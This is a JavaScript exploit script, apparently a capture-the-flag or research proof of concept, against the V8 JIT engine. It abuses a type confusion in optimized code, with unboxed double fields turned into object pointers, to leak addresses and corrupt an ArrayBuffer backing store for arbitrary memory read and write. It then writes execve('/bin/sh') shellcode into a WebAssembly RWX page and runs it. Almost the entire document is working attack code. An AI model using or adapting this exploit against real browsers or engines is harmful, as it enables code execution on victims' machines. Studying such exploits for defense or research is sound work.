function dp(x){}//{%DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();

// optimize this function based on unboxed double object
function leaker(o, g)
{
	const x = o.d;
	g(); // convert unboxed field to object pointer
	return o.d; // now we can leak the pointer
}
for (var i = 0; i < 0x1000; i++)
{
	leaker({d:1.1}, ()=>1);
	leaker({d:1.2}, ()=>2);
	leaker({d:1.3}, ()=>3);
} // trigger JIT

function addrOf(obj)
{
	const o = {d:13.37};
	const ret = leaker(o, function()
	{
		delete o.d;
		o.pad = obj;
		// if o.d here,
		// when addrOf is called second time
		// next o will not be unboxed double
	});
	return d2u(ret)-1;
}

// create an object which map contains
// information about its object field
// so that CheckMaps of object field is removed
function createObj()
{
	const od1 = {x1:1.2, x2:1.3};
	const o1 = {a:1};
	o1.b = 1;
	o1.o = od1;
	return o1;
}

// optimized this function based on
// object created from createObj
function abWriter(o, g, val)
{
	const x = o.o;
	g(); // change field to ArrayBuffer
	o.o.x2 = val; // write to backingStore
}


for (var i = 0; i < 0x1000; i++)
{
	abWriter(createObj(), ()=>1, 1.2);
	abWriter(createObj(), ()=>2, 1.3);
	abWriter(createObj(), ()=>3, 1.4);
} // JIT

const abHelper = new ArrayBuffer(8);
const dvHelper = new DataView(abHelper);
// ArrayBuffer used to rewrite
// backingStore of another ArrayBuffer
const ab = new ArrayBuffer(0x123);
const dataView = new DataView(ab);
// victim ArrayBuffer whose backingStore
// is to be changed

const backingAddr = addrOf(ab) + 0x20;
// leak address of &ab->backingStore

wmainLeaker = {l1:0x1337, l2:wmain};
// we need a wmainLeaker to leak wmain address
// we cannot use wmain directly into addrOf,
// because `o.pad = obj` does not write function
// into same position as unboxed double

// leak is put here as JIT loop might trigger GC

wmainAddr = addrOf(wmainLeaker);
print("[*] wmain leaker = "+hex(wmainAddr))
dp(wmainLeaker);

print("[*] &backingStore = "+hex(backingAddr));

o = createObj();
abWriter(o, function()
{
	o.o = 1.1;
	// without this,
	// decompilation will be triggered
	o.o = abHelper;
}, u2d(backingAddr));
// change backignStore of abHelper
// abHelper->backingStore = &ab->backingStore

dp(abHelper);


// now we can have arbitrary R&W
function memRead(addr)
{
	dvHelper.setFloat64(0, u2d(addr), true);
	return d2u(dataView.getFloat64(0, true));
}

const l33t = memRead(wmainAddr + 0x18);
assert(l33t === 0x133700000000, "cannot find sig!");
// try to read the wmain address,
// such assertion is making sure we are reading wmain

wmainAddr = memRead(wmainAddr + 0x20) - 1;
print("[*] wmain address = "+hex(wmainAddr))
// read wmain address

rwxAddr = memRead(wmainAddr - 0x110);
print("[*] RXW page = "+hex(rwxAddr))
// read RWX page

dvHelper.setFloat64(0, u2d(rwxAddr), true);
var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write shellcode to rwx page

wmain();
// execute the shellcode

throw Error("failed to get shell");